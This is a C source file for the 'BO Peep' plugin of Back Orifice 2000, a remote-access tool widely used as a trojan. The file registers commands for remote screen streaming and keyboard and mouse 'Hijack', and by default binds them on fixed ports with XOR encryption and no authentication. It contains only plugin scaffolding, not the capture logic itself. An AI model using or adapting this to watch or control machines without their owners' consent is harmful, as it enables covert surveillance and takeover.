/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<plugins.h>
#include<bocomreg.h>
#include<iohandler.h>
#include<encryption.h>
#include"bo_peep.h"
#include"vidstream.h"
#include"hijack.h"
#include"client.h"
#include"hiclient.h"

// ---------------- Global Linkage Variables -----------------
CEncryptionHandler				*g_pEncHandler=NULL;
CIOHandler						*g_pIOHandler=NULL;
TYPEOF_RegisterCommand			*RegisterCommand=NULL;
TYPEOF_UnregisterCommand		*UnregisterCommand=NULL;
TYPEOF_RegisterClientMenu		*RegisterClientMenu=NULL;
TYPEOF_UnregisterClientMenu		*UnregisterClientMenu=NULL;
TYPEOF_IssueAuthCommandRequest	*IssueAuthCommandRequest=NULL;
TYPEOF_IssueAuthCommandReply	*IssueAuthCommandReply=NULL;
TYPEOF_ConnectAuthSocket		*ConnectAuthSocket=NULL;
TYPEOF_ListenAuthSocket			*ListenAuthSocket=NULL;
TYPEOF_InteractiveConnect		*InteractiveConnect=NULL;
TYPEOF_InteractiveListen		*InteractiveListen=NULL;

#pragma comment(linker,"/section:.rdata,RW")
#pragma comment(linker,"/section:.data,RW")

// ------------- Function Implementations ------------------

HINSTANCE g_hInstance;
BOOL g_bActive;
long g_nNumThreads;
char g_szAdvancedOptions[]="<**CFG**>BO Peep\0"
						   "N[40,1600]:VidStream X Res=160\0\0"
                           "N[32,1200]:VidStream Y Res=120\0\0"
                           "S[8]:VidStream Net Module=TCPIO\0\0\0\0"
                           "S[32]:VidStream Bind Str=15151\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
						   "S[8]:VidStream Encryption=XOR\0\0\0\0\0\0"
						   "S[8]:VidStream Auth=NULLAUTH\0"
						   "S[8]:Hijack Net Module=TCPIO\0\0\0\0"
                           "S[32]:Hijack Bind Str=14141\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
						   "S[8]:Hijack Encryption=XOR\0\0\0\0\0\0"
						   "S[8]:Hijack Auth=NULLAUTH\0";
						   
int g_nStartVidStreamCmd;
int g_nStopVidStreamCmd;
int g_nStartHijackCmd;
int g_nStopHijackCmd;

BOOL WINAPI DllMain(HINSTANCE hInst, ULONG ul_reason_for_call, LPVOID lpReserved)
{
	// Do NOT perform configuration or initialization here

	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		g_hInstance=hInst;
		break;
	}
	return TRUE;
}

BOOL InstallPlugin(PLUGIN_LINKAGE pl)
{
	g_bActive=TRUE;
	g_nNumThreads=0;

	g_pEncHandler=pl.pEncryptionHandler;
	g_pIOHandler=pl.pIOHandler;
	RegisterCommand=pl.pRegisterCommand;
	UnregisterCommand=pl.pUnregisterCommand;
	IssueAuthCommandRequest=pl.pIssueAuthCommandRequest;
	IssueAuthCommandReply=pl.pIssueAuthCommandReply;
	ConnectAuthSocket=pl.pConnectAuthSocket;
	ListenAuthSocket=pl.pListenAuthSocket;
	RegisterClientMenu=pl.pRegisterClientMenu;
	UnregisterClientMenu=pl.pUnregisterClientMenu;
	InteractiveListen=pl.pInteractiveListen;
	InteractiveConnect=pl.pInteractiveConnect;
	
	if(RegisterCommand) {
		g_nStartVidStreamCmd=RegisterCommand(CmdProc_StartVidStream,"BO Peep","Start VidStream","[FPS Speed]","[Xres][,Yres][,NET][,ENC][,AUTH]","[Bind to]");
		g_nStopVidStreamCmd=RegisterCommand(CmdProc_StopVidStream,"BO Peep","Stop VidStream",NULL,NULL,NULL);
		g_nStartHijackCmd=RegisterCommand(CmdProc_StartHijack,"BO Peep","Start Hijack",NULL,"[NET,ENC,AUTH]","[Bind to]");
		g_nStopHijackCmd=RegisterCommand(CmdProc_StopHijack,"BO Peep","Stop Hijack",NULL,NULL,NULL);
	}
	if(RegisterClientMenu) {
		RegisterClientMenu("BO Peep","VidStream Client",CreateVidStreamClient);
		RegisterClientMenu("BO Peep","Hijack Client",CreateHijackClient);
	}

	return TRUE;
}

void TerminatePlugin(void)
{
	g_bActive=FALSE;
	while(g_nNumThreads>0) Sleep(20);
	Sleep(1000);

	if(UnregisterClientMenu) {
		UnregisterClientMenu("BO Peep","VidStream Client");
		UnregisterClientMenu("BO Peep","Hijack Client");
	}

	if(UnregisterCommand) {
		UnregisterCommand(g_nStopHijackCmd);
		UnregisterCommand(g_nStartHijackCmd);
		UnregisterCommand(g_nStopVidStreamCmd);
		UnregisterCommand(g_nStartVidStreamCmd);
	}

}


BOOL PluginVersion(PLUGIN_VERSION *ppv)
{
	ppv->svFilename="bo_peep.dll";
	ppv->svDescription="BO2K Remote Console Manager";
	ppv->wVersionHi=0;
	ppv->wVersionLo=7;
	ppv->wBOVersionHi=1;
	ppv->wBOVersionLo=0;

	return TRUE;
}
